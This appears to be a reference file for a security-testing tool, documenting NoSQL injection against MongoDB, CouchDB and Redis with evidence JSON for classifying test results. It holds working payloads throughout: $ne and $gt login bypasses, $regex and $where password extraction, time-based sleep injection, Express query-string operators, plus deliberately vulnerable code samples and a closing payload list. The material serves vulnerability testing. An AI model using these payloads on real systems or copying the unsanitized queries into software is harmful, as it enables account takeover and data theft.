# NoSQL Injection Examples

This file contains NoSQL injection examples with evidence patterns for MongoDB, CouchDB, Redis, and other NoSQL databases.

## Table of Contents
1. [Operator Injection - Authentication Bypass](#operator-injection---authentication-bypass)
2. [Operator Injection - Data Extraction](#operator-injection---data-extraction)
3. [JavaScript Injection](#javascript-injection)
4. [Boolean-Based Inference](#boolean-based-inference)
5. [Array/Query String Injection](#arrayquery-string-injection)
6. [Test Result Types](#test-result-types)
7. [Common Payloads Reference](#common-payloads-reference)

---

## Operator Injection - Authentication Bypass

### Example 1: MongoDB $ne Operator Bypass

**Scenario:** Login endpoint using MongoDB findOne without operator sanitization.

**Vulnerability:**
```javascript
// api/auth.js - VULNERABLE
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const user = await User.findOne({ username, password }); // No sanitization!
    if (user) return res.json({ success: true, user });
    return res.status(401).json({ error: "Invalid credentials" });
});
```

**Test:**
1. Baseline: `POST /login` with `{"username":"admin","password":"wrongpass"}` → 401
2. Payload: `POST /login` with `{"username":"admin","password":{"$ne":""}}` → 200 OK

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "nosql_operator_injection",
  "cwe": "CWE-943",
  "baseline": {
    "url": "http://target.com/login",
    "method": "POST",
    "payload": "{\"username\":\"admin\",\"password\":\"wrongpass\"}",
    "status": 401,
    "response_hash": "sha256:aaa..."
  },
  "test": {
    "url": "http://target.com/login",
    "method": "POST",
    "payload": "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}",
    "status": 200,
    "response_snippet": "{\"success\":true,\"user\":{\"username\":\"admin\",\"role\":\"admin\"}}",
    "response_hash": "sha256:bbb..."
  },
  "evidence": "NoSQL $ne operator bypassed password check - admin access granted",
  "payload_used": "{\"password\":{\"$ne\":\"\"}}"
}
```

---

### Example 2: MongoDB $gt Operator Bypass

**Scenario:** API endpoint comparing user-supplied values.

**Test:**
1. Baseline: `POST /login` with `{"username":"admin","password":"x"}` → 401
2. Payload: `POST /login` with `{"username":"admin","password":{"$gt":""}}` → 200 OK

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "nosql_operator_injection",
  "cwe": "CWE-943",
  "test": {
    "payload": "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}",
    "status": 200
  },
  "evidence": "NoSQL $gt operator bypassed password - matches any non-empty password",
  "payload_used": "{\"password\":{\"$gt\":\"\"}}"
}
```

---

## Operator Injection - Data Extraction

### Example 3: MongoDB $regex for Data Enumeration

**Scenario:** Search endpoint vulnerable to regex injection for data extraction.

**Test:**
1. `{"username":{"$regex":"^a"}}` → Returns users starting with 'a'
2. `{"username":{"$regex":"^ad"}}` → Returns users starting with 'ad'
3. Continue character-by-character enumeration

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "nosql_regex_injection",
  "cwe": "CWE-943",
  "test": {
    "url": "http://target.com/api/users",
    "method": "POST",
    "payload": "{\"filter\":{\"username\":{\"$regex\":\"^admin\"}}}",
    "status": 200,
    "response_snippet": "[{\"username\":\"admin\",\"email\":\"[REDACTED]\"}]"
  },
  "evidence": "NoSQL $regex allows character-by-character username enumeration",
  "payload_used": "{\"username\":{\"$regex\":\"^admin\"}}"
}
```

---

### Example 4: MongoDB $or for Expanded Results

**Scenario:** Filter endpoint vulnerable to $or injection.

**Test:**
1. Baseline: `GET /api/products?category=electronics` → 10 products
2. Payload: `POST /api/products` with `{"category":{"$or":[{},{"category":"electronics"}]}}` → 500 products

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "nosql_or_injection",
  "cwe": "CWE-943",
  "baseline": {
    "content_length": 2500,
    "item_count": 10
  },
  "test": {
    "content_length": 125000,
    "item_count": 500
  },
  "evidence": "NoSQL $or injection expanded query to return all documents",
  "payload_used": "{\"$or\":[{},{}]}"
}
```

---

## JavaScript Injection

### Example 5: MongoDB $where JavaScript Injection

**Scenario:** Query endpoint using $where clause with user input.

**Vulnerability:**
```javascript
// VULNERABLE - user input in $where clause
db.users.find({ $where: `this.role == '${userInput}'` });
```

**Test (Time-Based):**
1. Baseline: `POST /api/query` with `{"role":"user"}` → 0.2s
2. Payload: `POST /api/query` with `{"$where":"sleep(5000) || true"}` → 5.3s

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "nosql_javascript_injection",
  "cwe": "CWE-943",
  "baseline": {
    "response_time_seconds": 0.18
  },
  "test": {
    "payload": "{\"$where\":\"sleep(5000) || true\"}",
    "response_time_seconds": 5.32
  },
  "evidence": "MongoDB $where JS injection confirmed via 5s sleep delay",
  "payload_used": "{\"$where\":\"sleep(5000) || true\"}"
}
```

---

### Example 6: MongoDB $where Boolean Extraction

**Scenario:** Extract data character-by-character using $where.

**Test:**
```javascript
// Extract first char of admin password
{"$where": "this.username == 'admin' && this.password[0] == 'p'"}
// If true: returns admin document
// If false: returns empty
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "nosql_javascript_boolean_extraction",
  "cwe": "CWE-943",
  "test": {
    "true_condition": {
      "payload": "{\"$where\":\"this.username=='admin'&&this.password[0]=='p'\"}",
      "status": 200,
      "content_length": 250
    },
    "false_condition": {
      "payload": "{\"$where\":\"this.username=='admin'&&this.password[0]=='x'\"}",
      "status": 200,
      "content_length": 2
    }
  },
  "evidence": "NoSQL $where boolean injection - password extraction possible",
  "payload_used": "{\"$where\":\"this.password[0]=='p'\"}"
}
```

---

## Boolean-Based Inference

### Example 7: Response Length Difference

**Scenario:** Search endpoint with different response sizes based on query match.

**Test:**
1. `{"name":{"$regex":"^a"}}` → 5000 bytes (matches exist)
2. `{"name":{"$regex":"^zzzzzzz"}}` → 50 bytes (no matches)

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "nosql_boolean_based",
  "cwe": "CWE-943",
  "test": {
    "true_condition": {
      "payload": "{\"name\":{\"$regex\":\"^a\"}}",
      "content_length": 5000
    },
    "false_condition": {
      "payload": "{\"name\":{\"$regex\":\"^zzzzzzz\"}}",
      "content_length": 50
    }
  },
  "evidence": "Boolean-based NoSQLi - response length differs by 4950 bytes",
  "payload_used": "{\"name\":{\"$regex\":\"^...\"}}"
}
```

---

## Array/Query String Injection

### Example 8: Express.js Query String Array Injection

**Scenario:** Express app with extended query parser allowing array/object in query string.

**Test:**
```
GET /api/users?password[$ne]=
```
Express parses this as: `{ password: { $ne: '' } }`

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "nosql_query_string_injection",
  "cwe": "CWE-943",
  "test": {
    "url": "http://target.com/api/users?username=admin&password[$ne]=",
    "method": "GET",
    "status": 200,
    "response_snippet": "{\"username\":\"admin\",\"role\":\"admin\"}"
  },
  "evidence": "Query string operator injection via Express extended parser",
  "payload_used": "password[$ne]="
}
```

---

## Test Result Types

### FALSE_POSITIVE (Properly Secured)

**Scenario:** Application sanitizes operators or uses parameterized queries.

```json
{
  "status": "FALSE_POSITIVE",
  "injection_type": "nosql_injection",
  "test": {
    "payload": "{\"password\":{\"$ne\":\"\"}}",
    "status": 400,
    "response_snippet": "{\"error\":\"Invalid password format\"}"
  },
  "evidence": "Operators rejected - input validation in place"
}
```

### UNVALIDATED (Error/Blocked)

```json
{
  "status": "UNVALIDATED",
  "injection_type": "nosql_injection",
  "reason": "Server returned 500 error on operator payload",
  "test": {
    "status": 500,
    "response_snippet": "{\"error\":\"Internal server error\"}"
  },
  "evidence": "Cannot determine vulnerability status - server error"
}
```

### PARTIAL (Weak Signal)

```json
{
  "status": "PARTIAL",
  "injection_type": "nosql_injection",
  "tests": {
    "ne_operator": {"status": 401, "note": "$ne rejected"},
    "regex_operator": {"status": 200, "note": "$regex accepted but no auth bypass"}
  },
  "evidence": "Some operators accepted but no clear exploitation path",
  "requires_manual_review": true
}
```

---

## Common Payloads Reference

### MongoDB Operator Payloads

**Authentication Bypass:**
```json
{"$ne": ""}
{"$ne": null}
{"$gt": ""}
{"$gte": ""}
{"$lt": "~"}
{"$exists": true}
{"$regex": ".*"}
{"$in": ["admin", "root", "administrator"]}
```

**Logical Operators:**
```json
{"$or": [{}, {"password": ""}]}
{"$and": [{"username": "admin"}, {"password": {"$ne": ""}}]}
{"$nor": [{"password": "wrongpassword"}]}
```

**Regex Patterns:**
```json
{"$regex": "^a"}
{"$regex": "^ad"}
{"$regex": "^adm"}
{"$regex": ".*", "$options": "i"}
```

### JavaScript Injection ($where)

**Time-Based:**
```javascript
{"$where": "sleep(5000)"}
{"$where": "sleep(5000) || true"}
{"$where": "(function(){sleep(5000);return true;})()"}
```

**Boolean Extraction:**
```javascript
{"$where": "this.password.length > 5"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}
```

**Data Extraction:**
```javascript
{"$where": "this.username == 'admin'"}
{"$where": "Object.keys(this).length > 3"}
```

### Query String Injection (Express.js)

```
?username=admin&password[$ne]=
?username=admin&password[$gt]=
?username[$regex]=admin&password[$ne]=
?filter[$or][0][username]=admin&filter[$or][1][username]=root
```

### CouchDB Payloads

```json
{"selector": {"$or": [{}, {"password": "x"}]}}
{"selector": {"password": {"$regex": ".*"}}}
```

### Redis Command Injection

```
EVAL "redis.call('GET','password')" 0
DEBUG SLEEP 5
```

---

## CWE Reference

| CWE | Name | DAST Testable |
|-----|------|---------------|
| CWE-943 | Improper Neutralization of Special Elements in Data Query Logic | Yes |
| CWE-74 | Injection (parent) | Yes |
| CWE-20 | Improper Input Validation | Partial |

**Related Attack Patterns:**
- CAPEC-676: NoSQL Injection
